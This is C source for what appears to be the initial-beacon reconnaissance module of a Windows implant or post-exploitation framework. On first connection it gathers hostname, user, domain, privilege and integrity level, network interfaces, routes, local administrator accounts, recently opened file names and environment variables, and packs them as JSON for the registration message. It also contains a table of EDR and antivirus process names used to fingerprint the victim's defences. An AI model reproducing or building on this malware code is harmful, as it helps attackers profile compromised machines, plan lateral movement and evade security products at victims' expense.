/**
 * auto_enum.c - Automatic enumeration on initial beacon
 *
 * Runs a battery of safe, low-noise enumeration on first connection.
 * Results are sent as structured JSON with the registration message.
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <lm.h>
#include <shlobj.h>
#include "../../include/postex.h"
#include "../../include/json.h"

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "shell32.lib")

typedef struct {
    char hostname[256];
    char os_version[128];
    char arch[16];
    char domain[256];
    char username[256];
    BOOL is_admin;
    BOOL is_system;
    int pid;
    int ppid;
    char integrity[32];
    char av_products[1024];
    char interfaces[2048];
    char routes[1024];
    int process_count;
    char local_admins[2048];
} AUTO_ENUM_RESULT;

static char *g_pending_enum = NULL;

static int json_step(int *pos, char *buf, int cap, int n) {
    if (n < 0 || *pos + n >= cap) return -1;
    *pos += n;
    return 0;
}

static int json_comma(int *pos, char *buf, int cap) {
    if (*pos + 1 >= cap) return -1;
    buf[(*pos)++] = ',';
    return 0;
}

typedef struct {
    const char *process_name;
    const char *product_name;
} AV_SIGNATURE;

static const AV_SIGNATURE av_signatures[] = {
    {"MsMpEng.exe", "Windows Defender"},
    {"MsSense.exe", "Microsoft Defender for Endpoint"},
    {"SenseIR.exe", "Microsoft Defender for Endpoint (IR)"},
    {"csfalconservice.exe", "CrowdStrike Falcon"},
    {"CSFalconContainer.exe", "CrowdStrike Falcon"},
    {"CSFalconService.exe", "CrowdStrike Falcon"},
    {"cb.exe", "Carbon Black"},
    {"CbDefense.exe", "Carbon Black Cloud"},
    {"RepMgr.exe", "Carbon Black"},
    {"cylancesvc.exe", "Cylance"},
    {"CylanceSvc.exe", "Cylance"},
    {"SentinelAgent.exe", "SentinelOne"},
    {"SentinelServiceHost.exe", "SentinelOne"},
    {"TmPfw.exe", "Trend Micro"},
    {"NTRtScan.exe", "Trend Micro"},
    {"ccSvcHst.exe", "Symantec"},
    {"Rtvscan.exe", "Symantec"},
    {"McShield.exe", "McAfee"},
    {"masvc.exe", "McAfee"},
    {"elastic-agent.exe", "Elastic Agent"},
    {"winlogbeat.exe", "Elastic Winlogbeat"},
    {"filebeat.exe", "Elastic Filebeat"},
    {"traps.exe", "Palo Alto Cortex XDR"},
    {"cyserver.exe", "Palo Alto Cortex XDR"},
    {"xagt.exe", "FireEye/Cortex XDR"},
    {NULL, NULL}
};

static char *build_enum_json(const AUTO_ENUM_RESULT *r, char recent_files[512],
                             char env_interest[1024]) {
    size_t cap = 16384;
    char *json = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cap);
    if (!json) return NULL;

    int pos = 0;
    json[pos++] = '{';

    if (json_step(&pos, json, (int)cap, json_emit_kv(json + pos, (int)cap - pos, "hostname", r->hostname)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv(json + pos, (int)cap - pos, "os_version", r->os_version)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv(json + pos, (int)cap - pos, "arch", r->arch)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv(json + pos, (int)cap - pos, "domain", r->domain)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv(json + pos, (int)cap - pos, "username", r->username)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv_bool(json + pos, (int)cap - pos, "is_admin", r->is_admin)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv_bool(json + pos, (int)cap - pos, "is_system", r->is_system)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv_int(json + pos, (int)cap - pos, "pid", r->pid)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv_int(json + pos, (int)cap - pos, "ppid", r->ppid)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv(json + pos, (int)cap - pos, "integrity", r->integrity)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv(json + pos, (int)cap - pos, "av_products", r->av_products)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv(json + pos, (int)cap - pos, "interfaces", r->interfaces)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv(json + pos, (int)cap - pos, "routes", r->routes)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv_int(json + pos, (int)cap - pos, "process_count", r->process_count)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv(json + pos, (int)cap - pos, "local_admins", r->local_admins)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv(json + pos, (int)cap - pos, "recent_files", recent_files)) < 0) goto fail;
    if (json_comma(&pos, json, (int)cap) < 0) goto fail;
    if (json_step(&pos, json, (int)cap, json_emit_kv(json + pos, (int)cap - pos, "env_interest", env_interest)) < 0) goto fail;

    if (pos + 1 >= (int)cap) goto fail;
    json[pos++] = '}';
    json[pos] = '\0';
    return json;

fail:
    HeapFree(GetProcessHeap(), 0, json);
    return NULL;
}

int auto_enum_integrity(char *out, int max_out) {
    if (!out || max_out <= 0) return -1;
    out[0] = '\0';

    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return -1;

    BYTE tbuf[256];
    DWORD tbuf_len = 0;
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, tbuf, sizeof(tbuf), &tbuf_len)) {
        CloseHandle(hToken);
        return -1;
    }

    PTOKEN_MANDATORY_LABEL pTML = (PTOKEN_MANDATORY_LABEL)tbuf;
    DWORD integrity = *GetSidSubAuthority(pTML->Label.Sid,
        (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTML->Label.Sid) - 1));

    const char *level = "Low";
    if (integrity >= SECURITY_MANDATORY_SYSTEM_RID) level = "System";
    else if (integrity >= SECURITY_MANDATORY_HIGH_RID) level = "High";
    else if (integrity >= SECURITY_MANDATORY_MEDIUM_RID) level = "Medium";

    lstrcpynA(out, level, max_out);
    CloseHandle(hToken);
    return 0;
}

int auto_enum_detect_av(char *out, int max_out) {
    if (!out || max_out <= 0) return -1;
    out[0] = '\0';

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return -1;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    int offset = 0;
    int found = 0;

    if (Process32First(snap, &pe)) {
        do {
            for (int i = 0; av_signatures[i].process_name != NULL; i++) {
                if (_stricmp(pe.szExeFile, av_signatures[i].process_name) == 0) {
                    if (found > 0 && offset < max_out - 2) {
                        offset += _snprintf(out + offset, max_out - offset, "; ");
                    }
                    offset += _snprintf(out + offset, max_out - offset, "%s",
                        av_signatures[i].product_name);
                    found++;
                    break;
                }
            }
        } while (Process32Next(snap, &pe) && offset < max_out - 64);
    }

    CloseHandle(snap);
    if (found == 0)
        lstrcpynA(out, "None detected", max_out);
    return found;
}

static void collect_system_info(AUTO_ENUM_RESULT *r) {
    DWORD len = sizeof(r->hostname);
    GetComputerNameA(r->hostname, &len);

    len = sizeof(r->username);
    GetUserNameA(r->username, &len);

    len = sizeof(r->domain);
    if (!GetEnvironmentVariableA("USERDOMAIN", r->domain, sizeof(r->domain)))
        GetComputerNameExA(ComputerNameDnsDomain, r->domain, &len);

    r->pid = (int)GetCurrentProcessId();

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do {
                r->process_count++;
                if (pe.th32ProcessID == (DWORD)r->pid)
                    r->ppid = (int)pe.th32ParentProcessID;
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }

    OSVERSIONINFOEXW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    typedef NTSTATUS(NTAPI *pRtlGetVersion)(PRTL_OSVERSIONINFOW);
    pRtlGetVersion RtlGetVersion = (pRtlGetVersion)GetProcAddress(
        GetModuleHandleA("ntdll"), "RtlGetVersion");
    if (RtlGetVersion) {
        RtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);
        _snprintf(r->os_version, sizeof(r->os_version), "Windows %lu.%lu Build %lu",
            osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    } else {
        lstrcpynA(r->os_version, "Windows", sizeof(r->os_version));
    }

    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    lstrcpynA(r->arch,
        si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86",
        sizeof(r->arch));

    auto_enum_integrity(r->integrity, (int)sizeof(r->integrity));
    auto_enum_detect_av(r->av_products, (int)sizeof(r->av_products));

    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    PSID adminSid = NULL;
    if (AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminSid)) {
        HANDLE hToken = NULL;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            r->is_admin = CheckTokenMembership(hToken, adminSid, &r->is_admin) && r->is_admin;
            CloseHandle(hToken);
        }
        FreeSid(adminSid);
    }

    r->is_system = (_stricmp(r->username, "SYSTEM") == 0);
}

static void collect_interfaces(AUTO_ENUM_RESULT *r) {
    int offset = 0;
    PIP_ADAPTER_INFO adapters = NULL;
    ULONG size = 0;
    GetAdaptersInfo(NULL, &size);
    adapters = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), 0, size);
    if (adapters && GetAdaptersInfo(adapters, &size) == ERROR_SUCCESS) {
        for (PIP_ADAPTER_INFO cur = adapters; cur && offset < (int)sizeof(r->interfaces) - 128; cur = cur->Next) {
            offset += _snprintf(r->interfaces + offset, sizeof(r->interfaces) - offset,
                "%s=%s; ", cur->Description, cur->IpAddressList.IpAddress.String);
        }
    }
    if (adapters) HeapFree(GetProcessHeap(), 0, adapters);
}

static void collect_routes(AUTO_ENUM_RESULT *r) {
    PMIB_IPFORWARDTABLE table = NULL;
    DWORD size = 0;
    if (GetIpForwardTable(NULL, &size, TRUE) != ERROR_INSUFFICIENT_BUFFER) return;
    table = (PMIB_IPFORWARDTABLE)HeapAlloc(GetProcessHeap(), 0, size);
    if (!table) return;
    if (GetIpForwardTable(table, &size, TRUE) != NO_ERROR) {
        HeapFree(GetProcessHeap(), 0, table);
        return;
    }

    int offset = 0;
    for (DWORD i = 0; i < table->dwNumEntries && offset < (int)sizeof(r->routes) - 96; i++) {
        MIB_IPFORWARDROW *row = &table->table[i];
        struct in_addr dest, gw;
        dest.S_un.S_addr = row->dwForwardDest;
        gw.S_un.S_addr = row->dwForwardNextHop;
        offset += _snprintf(r->routes + offset, sizeof(r->routes) - offset,
            "%s/%lu via %s; ",
            inet_ntoa(dest), row->dwForwardMask, inet_ntoa(gw));
    }
    HeapFree(GetProcessHeap(), 0, table);
}

static void collect_local_admins(AUTO_ENUM_RESULT *r) {
    PLOCALGROUP_MEMBERS_INFO_1 members = NULL;
    DWORD entries = 0, total = 0;
    NET_API_STATUS st = NetLocalGroupGetMembers(NULL, L"Administrators", 1,
        (LPBYTE *)&members, MAX_PREFERRED_LENGTH, &entries, &total, NULL);
    if (st != NERR_Success) return;

    int offset = 0;
    for (DWORD i = 0; i < entries && offset < (int)sizeof(r->local_admins) - 128; i++) {
        char name[256];
        WideCharToMultiByte(CP_UTF8, 0, members[i].lgrmi1_name, -1,
            name, sizeof(name), NULL, NULL);
        if (i > 0) offset += _snprintf(r->local_admins + offset,
            sizeof(r->local_admins) - offset, ", ");
        offset += _snprintf(r->local_admins + offset,
            sizeof(r->local_admins) - offset, "%s", name);
    }
    NetApiBufferFree(members);
}

static void collect_recent_files(char *out, int max_out) {
    if (!out || max_out <= 0) return;
    out[0] = '\0';

    char recent[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_RECENT, NULL, 0, recent)))
        return;

    lstrcatA(recent, "\\*");
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(recent, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    int offset = 0;
    int count = 0;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (count >= 8) break;
        if (count > 0) offset += _snprintf(out + offset, max_out - offset, "; ");
        offset += _snprintf(out + offset, max_out - offset, "%s", fd.cFileName);
        count++;
    } while (FindNextFileA(hFind, &fd) && offset < max_out - 128);
    FindClose(hFind);
}

static void collect_env_interest(char *out, int max_out) {
    static const char *vars[] = {
        "COMPUTERNAME", "USERDOMAIN", "LOGONSERVER", "USERDNSDOMAIN",
        "PROCESSOR_ARCHITECTURE", "NUMBER_OF_PROCESSORS", NULL
    };
    int offset = 0;
    for (int i = 0; vars[i] && offset < max_out - 128; i++) {
        char val[256];
        if (GetEnvironmentVariableA(vars[i], val, sizeof(val))) {
            if (offset > 0) offset += _snprintf(out + offset, max_out - offset, "; ");
            offset += _snprintf(out + offset, max_out - offset, "%s=%s", vars[i], val);
        }
    }
}

char *auto_enum_run(void) {
    if (g_pending_enum) {
        HeapFree(GetProcessHeap(), 0, g_pending_enum);
        g_pending_enum = NULL;
    }

    AUTO_ENUM_RESULT result;
    ZeroMemory(&result, sizeof(result));

    char recent_files[512] = {0};
    char env_interest[1024] = {0};

    collect_system_info(&result);
    collect_interfaces(&result);
    collect_routes(&result);
    collect_local_admins(&result);
    collect_recent_files(recent_files, (int)sizeof(recent_files));
    collect_env_interest(env_interest, (int)sizeof(env_interest));

    g_pending_enum = build_enum_json(&result, recent_files, env_interest);
    return g_pending_enum;
}

const char *auto_enum_peek(void) {
    return g_pending_enum;
}

void auto_enum_release(void) {
    if (g_pending_enum) {
        HeapFree(GetProcessHeap(), 0, g_pending_enum);
        g_pending_enum = NULL;
    }
}
